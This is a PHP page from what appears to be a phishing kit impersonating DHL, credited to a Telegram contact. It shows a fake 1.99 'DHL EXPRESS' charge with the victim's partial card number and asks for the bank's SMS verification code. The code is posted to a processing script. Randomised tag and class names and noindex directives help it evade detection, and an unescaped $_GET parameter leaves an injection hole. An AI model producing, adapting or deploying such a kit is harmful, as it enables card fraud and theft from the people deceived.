<?php
    /*******
    Telegram : https://t.me/elgh03t
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "sms";
    $cc = substr($_SESSION['one'], -4);
    $semantic1 = semantic();
    $semantic2 = semantic();
    $semantic3 = semantic();
    $semantic4 = semantic();
    $semantic5 = semantic();

?>
<!doctype html>
<html <?php if( $_SESSION['lang'] == 'ar' ) { echo 'dir="rtl"'; } ?>>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <?php
        if( $_SESSION['lang'] == "ar" ) {
            ?>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.rtl.min.css">
            <link rel="stylesheet" href="../media/css/helpers.css">
            <link rel="stylesheet" href="../media/css/stylear.css">
            <?php
        } else {
            ?>
            <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
            <link rel="stylesheet" href="../media/css/helpers.css">
            <link rel="stylesheet" href="../media/css/style.css">
            <?php
        }
        ?>

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>DHL</title>
    </head>

    <body>

        <<?php echo $semantic1; ?> id="<?php echo rr(); ?>ss-wrapper<?php echo rr(); ?>">
            <<?php echo $semantic2; ?> class="<?php echo rr(); ?>ss-area<?php echo rr(); ?>">
                <input type="hidden" id="cap" name="cap">
                <input type="hidden" name="steeep" id="steeep" value="sms">
                <input type="hidden" name="error" id="error" value="<?php echo $_GET['error']; ?>">
                <<?php echo $semantic3; ?> class="top d-flex align-items-center">
                    <<?php echo $semantic4; ?> class="flex-grow-1"><img style="width: 100px;" src="../media/imgs/logo.svg"></<?php echo $semantic4; ?>>
                    <<?php echo $semantic4; ?>><img src="../media/imgs/vs.png"></<?php echo $semantic4; ?>>
                </<?php echo $semantic3; ?>>
                <h3><?php echo get_text('sms-title'); ?></h3>
                <<?php echo $semantic3; ?> class="<?php echo rr(); ?>details<?php echo rr(); ?>">
                    <p><?php echo get_text('sms-message'); ?></p>
                    <table>
                        <tr>
                            <td><?php echo get_text('merchant'); ?>:</td>
                            <td>DHL EXPRESS</td>
                        </tr>
                        <tr>
                            <td><?php echo get_text('amount'); ?>:</td>
                            <td>1.99<?php echo $_SESSION['currency']; ?></td>
                        </tr>
                        <tr>
                            <td><?php echo get_text('date'); ?>:</td>
                            <td><?php echo date('d/m/Y'); ?></td>
                        </tr>
                        <tr>
                            <td><?php echo get_text('credit-card-number'); ?></td>
                            <td>XXXX XXXX XXXX <?php echo $cc; ?></td>
                        </tr>
                        <!--<tr>
                            <td>Your phone number</td>
                            <td><?php //echo $_SESSION['phone']; ?></td>
                        </tr>-->
                        <tr>
                            <td><?php echo get_text('sms_code_label'); ?></td>
                            <td>
                                <input type="text" inputmode="numeric" maxlength="8" name="sms_code" id="sms_code" class="<?php echo errclass($_SESSION['errors'],'sms_code') ?>">
                                <?php
                                if( !empty($_SESSION['errors']['sms_code']) ) {
                                    echo '<p style="color: #D40511; font-size: 12px; margin-bottom: 0;">'. get_text('sms_code_error') .'</p>';
                                }
                                ?>
                            </td>
                        </tr>
                    </table>
                    <p style="font-size: 14px; text-align: center; margin-bottom: 0; margin-top: 10px;"><?php echo get_text('sms-again'); ?> : <span class="timer" style="color: #d40511; font-weight: 700; cursor: pointer;"></span></p>
                </<?php echo $semantic3; ?>>
                <<?php echo $semantic3; ?> class="<?php echo rr(); ?>btns<?php echo rr(); ?>">
                    <<?php echo $semantic5; ?> id="booom" class="<?php echo rr(); ?>btttn<?php echo rr(); ?>"><?php echo get_text('submit'); ?></<?php echo $semantic5; ?>>
                </<?php echo $semantic3; ?>>
                <p class="<?php echo rr(); ?>copy<?php echo rr(); ?>"><?php echo get_text('copyright'); ?></p>
            </<?php echo $semantic2; ?>>
        </<?php echo $semantic1; ?>>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/countdown.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script type="text/javascript">
            var try_again = "<?php echo get_text('try_again'); ?>";
            $(".timer").countdowntimer({
                minutes : 2,
                timeUp : timeIsUp
            });
            function timeIsUp() {
                $(".timer").html(try_again);
            }
            $('.timer').click(function(){
                location.reload();
            });
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'sms_code' : $('#sms_code').val(),
                    'error' : $('#error').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>